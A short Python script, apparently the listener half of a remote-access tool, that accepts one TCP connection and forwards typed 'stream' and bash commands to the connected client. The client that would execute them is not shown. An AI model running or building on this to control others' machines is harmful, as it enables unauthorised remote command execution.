import os
import socket


host = socket.gethostbyname(socket.gethostname())
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ADDR = host, port

s.bind(ADDR)

print("\n Server is currently running @", host)

print("\n Waiting for incomming connections")

s.listen(1)
conn, addr = s.accept()

print("\n", addr, "Has connected to the server succsessfully")

while 1:

    command = input("\n Command>>>")



    if command == "stream":
        conn.send(command.encode())

    elif command == "bat":
        conn.send((command.encode()))
        run = True

        while run:
            user_command = input("Bash Command>>>")
            conn.send(user_command.encode())


  

    else:
        print("\n This is not a valid command")
